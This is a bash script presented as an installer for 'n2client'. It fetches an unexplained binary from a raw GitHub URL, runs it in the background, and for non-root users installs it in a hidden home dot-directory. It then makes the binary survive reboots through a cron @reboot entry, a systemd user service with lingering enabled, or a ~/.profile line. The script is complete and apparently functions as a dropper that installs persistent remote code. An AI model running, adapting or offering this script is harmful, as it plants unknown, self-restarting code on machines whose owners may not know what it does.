#!/bin/bash
# Robust n2client installer with persistence (works for root & normal user)
set -e

APP_NAME="n2client"
BINARY_URL="https://raw.githubusercontent.com/hellow2003/phpcode/main/client"
LOGFILE="/tmp/${APP_NAME}.log"

# ========== 1. Detect user & set paths ==========
if [ "$EUID" -eq 0 ]; then
    INSTALL_DIR="/usr/local/bin"
    RUN_USER="root"
else
    INSTALL_DIR="$HOME/.${APP_NAME}"
    RUN_USER="$USER"
fi

mkdir -p "$INSTALL_DIR"
BIN_PATH="$INSTALL_DIR/$APP_NAME"

# ========== 2. Download binary (skip if exists) ==========
if [ -f "$BIN_PATH" ]; then
    echo "[*] Binary already present: $BIN_PATH"
else
    echo "[*] Downloading $BINARY_URL ..."
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 10 --max-time 30 "$BINARY_URL" -o "$BIN_PATH" || {
            echo "ERROR: curl download failed." >&2; exit 1;
        }
    elif command -v wget >/dev/null 2>&1; then
        wget -q --timeout=600 "$BINARY_URL" -O "$BIN_PATH" || {
            echo "ERROR: wget download failed." >&2; exit 1;
        }
    else
        echo "ERROR: Install curl or wget first." >&2
        exit 1
    fi
    chmod +x "$BIN_PATH"
    echo "[+] Binary installed at $BIN_PATH"
fi

# ========== 3. Start immediately (if not already running) ==========
if pgrep -x "$APP_NAME" >/dev/null; then
    echo "[*] $APP_NAME already running. Skipping start."
else
    echo "[*] Launching $APP_NAME ..."
    nohup "$BIN_PATH" >> "$LOGFILE" 2>&1 &
    sleep 1
    if pgrep -x "$APP_NAME" >/dev/null; then
        echo "[+] $APP_NAME started (PID $(pgrep -x $APP_NAME))"
    else
        echo "[WARN] $APP_NAME may have exited immediately. Check $LOGFILE"
    fi
fi

# ========== 4. Persistence setup (multiple strategies) ==========
setup_persistence() {
    local bin="$1"
    local log="$2"
    local user="$3"

    # ---------- A. Cron @reboot (most reliable) ----------
    if command -v crontab >/dev/null 2>&1; then
        local croncmd="@reboot sleep 30 && $bin >> $log 2>&1"
        echo "[*] Setting up cron @reboot for user '$user'"

        if [ "$user" = "root" ]; then
            # Use sudo to manipulate root's crontab
            (sudo crontab -l 2>/dev/null | grep -v "$bin" || true; echo "$croncmd") | sudo crontab - || {
                echo "ERROR: Failed to update root crontab." >&2
                return 1
            }
        else
            (crontab -l 2>/dev/null | grep -v "$bin" || true; echo "$croncmd") | crontab - || {
                echo "ERROR: Failed to update user crontab." >&2
                return 1
            }
        fi
        echo "[+] Cron @reboot entry added (delay 30s). Logs: $log"
        return 0
    fi

    # ---------- B. systemd user service (for non-root users) ----------
    if command -v systemctl >/dev/null 2>&1 && [ "$user" != "root" ]; then
        echo "[*] Trying systemd user service..."
        mkdir -p "$HOME/.config/systemd/user"
        cat > "$HOME/.config/systemd/user/${APP_NAME}.service" <<EOF
[Unit]
Description=$APP_NAME
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$bin
Restart=always
RestartSec=10
StandardOutput=append:$log
StandardError=append:$log

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload
        systemctl --user enable "${APP_NAME}.service" 2>/dev/null || {
            echo "[!] systemctl --user enable failed"; return 1;
        }
        systemctl --user start "${APP_NAME}.service" 2>/dev/null || true

        # Enable lingering so service starts at boot (before login)
        if command -v loginctl >/dev/null 2>&1; then
            loginctl enable-linger 2>/dev/null || true
        fi
        echo "[+] systemd user service installed."
        return 0
    fi

    # ---------- C. Fallback: .profile (only on login, not boot) ----------
    if [ -f "$HOME/.profile" ]; then
        if ! grep -qF "$bin" "$HOME/.profile"; then
            echo "nohup $bin >> $log 2>&1 &" >> "$HOME/.profile"
            echo "[!] Added to ~/.profile (works after login)."
        fi
        return 0
    fi

    echo "[!] No persistence method available. Reboot will not auto-start." >&2
    return 1
}

# Call with proper parameters
setup_persistence "$BIN_PATH" "$LOGFILE" "$RUN_USER"

# ========== 5. Final checks ==========
echo "=============================================="
echo "[✓] Installation complete."
echo "    Binary      : $BIN_PATH"
echo "    Running as  : $RUN_USER"
echo "    Log file    : $LOGFILE"
echo "    Persistence : $(crontab -l 2>/dev/null | grep '@reboot' | head -1 || echo 'none')"
echo "=============================================="
